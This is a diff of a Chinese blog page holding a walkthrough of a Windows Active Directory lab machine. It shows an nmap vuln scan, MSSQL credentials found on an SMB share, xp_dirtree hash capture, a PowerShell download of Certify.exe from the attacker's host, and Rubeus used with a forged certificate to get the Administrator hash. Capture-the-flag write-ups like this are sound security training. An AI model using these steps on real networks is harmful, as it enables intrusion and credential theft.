@@ -39,7 +39,7 @@
 <meta property="og:image" content="https://s2.loli.net/2023/06/13/8IvxrKgzoQC2L6Y.png">
 <meta property="og:image" content="https://s2.loli.net/2023/06/13/fxwF2VGkBpiP9YZ.png">
 <meta property="article:published_time" content="2023-06-13T12:35:02.000Z">
-<meta property="article:modified_time" content="2023-06-13T14:04:40.723Z">
+<meta property="article:modified_time" content="2023-06-13T14:08:33.788Z">
 <meta property="article:author" content="sha&amp;blog">
 <meta property="article:tag" content="windows">
 <meta name="twitter:card" content="summary">
@@ -226,7 +226,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2023-06-13 20:35:02 / 修改时间：22:04:40" itemprop="dateCreated datePublished" datetime="2023-06-13T20:35:02+08:00">2023-06-13</time>
+              <time title="创建时间：2023-06-13 20:35:02 / 修改时间：22:08:33" itemprop="dateCreated datePublished" datetime="2023-06-13T20:35:02+08:00">2023-06-13</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -284,51 +284,31 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.94 scan initiated Sun Jun 11 20:24:43 2023 as: nmap --script=vuln -p53,88,135,139,389,445,464,593,636,1433,3268,5985,9389,49667,49687,49701,49709,52716 -oA nmap/vuln 10.10.11.202</span><br><span class="line">Nmap scan report for 10.10.11.202</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">1433/tcp  open  ms-sql-s</span><br><span class="line">|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49687/tcp open  unknown</span><br><span class="line">49701/tcp open  unknown</span><br><span class="line">49709/tcp open  unknown</span><br><span class="line">52716/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span><br><span class="line">|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line"></span><br><span class="line"># Nmap done at Sun Jun 11 20:26:58 2023 -- 1 IP address (1 host up) scanned in 134.59 seconds</span><br></pre></td></tr></table></figure>
 <h2 id="一些尝试">一些尝试</h2>
 <p>开了rpc，尝试爆一下uuid和操作数</p>
-<figure>
-<img src="https://s2.loli.net/2023/06/13/ByCbcAmxUE5ie2t.png" alt="1.png"><figcaption aria-hidden="true">1.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/06/13/ByCbcAmxUE5ie2t.png"></p>
 <p>失败，开了samba尝试一下匿名登录</p>
-<figure>
-<img src="https://s2.loli.net/2023/06/13/ExOBP5khLS2GlUt.png" alt="2.png"><figcaption aria-hidden="true">2.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/06/13/ExOBP5khLS2GlUt.png"></p>
 <p>有一个PDF，里面写了mssql的公用账户和密码</p>
-<figure>
-<img src="https://s2.loli.net/2023/06/13/fsK9l3DP6JNYZTb.png" alt="3.png"><figcaption aria-hidden="true">3.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/06/13/fsK9l3DP6JNYZTb.png"></p>
 <p>接下来就是长达两个小时试图在kali里面连接mssql</p>
-<figure>
-<img src="https://s2.loli.net/2023/06/13/EizZkYhRHmSeWNw.png" alt="4.png"><figcaption aria-hidden="true">4.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/06/13/EizZkYhRHmSeWNw.png"></p>
 <p>后来发现微软官方说的支持linux系统里面没有Kali🥲</p>
-<figure>
-<img src="https://s2.loli.net/2023/06/13/nI6gqaik8cQdvzE.png" alt="5.png"><figcaption aria-hidden="true">5.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/06/13/nI6gqaik8cQdvzE.png"></p>
 <p>docker也用不了</p>
 <p>最后发现Kali自带impacket包</p>
-<figure>
-<img src="https://s2.loli.net/2023/06/13/EyHo2ZmIaV56uW4.png" alt="6.png"><figcaption aria-hidden="true">6.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/06/13/EyHo2ZmIaV56uW4.png"></p>
 <p>登进去以后发现xp_cmdshell被ban了，数据库里面也没有什么有用的信息</p>
 <p>后来发现了<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_60115503/article/details/124120094">浅析mssql渗透之XP_dirtree LLMNR/NBT-NS欺骗攻击_QiaN_djx的博客-CSDN博客</a></p>
 <p>跟着打就可以得到用户哈希，John直接可以跑出来</p>
-<figure>
-<img src="https://s2.loli.net/2023/06/13/agntNA2bZehRT1Y.png" alt="7.png"><figcaption aria-hidden="true">7.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/06/13/agntNA2bZehRT1Y.png"></p>
 <h2 id="信息搜集-1">信息搜集</h2>
 <p>可以看到有3个用户，接下来应该就是要移动到Ryan.Cooper了</p>
-<p>在C:，可以看到Ryan.Cooper的用户名密码。</p>
-<figure>
-<img src="https://s2.loli.net/2023/06/13/hlCSYqcp9yHWM7B.png" alt="8.png"><figcaption aria-hidden="true">8.png</figcaption>
-</figure>
+<p>在C:\sqlserver\logs里面有一份日志备份文件，可以看到Ryan.Cooper的用户名密码。</p>
+<p><img src="https://s2.loli.net/2023/06/13/hlCSYqcp9yHWM7B.png"></p>
 <p>在desktop里面找到了userflag</p>
-<figure>
-<img src="https://s2.loli.net/2023/06/13/2PE5Tq1nGukcRgZ.png" alt="9.png"><figcaption aria-hidden="true">9.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/06/13/2PE5Tq1nGukcRgZ.png"></p>
 <p>找到了这个<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation">AD CS Domain Escalation - HackTricks</a></p>
 <p>找了一个xd的exe集合包<a target="_blank" rel="noopener" href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">r3motecontrol/Ghostpack-CompiledBinaries: Compiled Binaries for Ghostpack (.NET v4.0) (github.com)</a></p>
-<figure>
-<img src="https://s2.loli.net/2023/06/13/8IvxrKgzoQC2L6Y.png" alt="11.png"><figcaption aria-hidden="true">11.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/06/13/8IvxrKgzoQC2L6Y.png"></p>
 <p>微软NB</p>
 <p>windows用Invoke-Webrequest下文件</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WebRequest &quot;http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">173</span>:<span class="number">1234</span>/Certify.exe &quot; -OutFile &quot;C:\Users\Ryan.Cooper\Documents\Certify.exe&quot;</span><br></pre></td></tr></table></figure>
@@ -337,9 +317,7 @@
 <p>最后把Rubus和pfx传上去，得到administrator的ntlm</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials </span><br></pre></td></tr></table></figure>
 <p>生成证书的时候空密码就不用加password参数</p>
-<figure>
-<img src="https://s2.loli.net/2023/06/13/fxwF2VGkBpiP9YZ.png" alt="10.png"><figcaption aria-hidden="true">10.png</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2023/06/13/fxwF2VGkBpiP9YZ.png"></p>
 <p>在desktop里找到rootflag😭</p>
 
     </div>
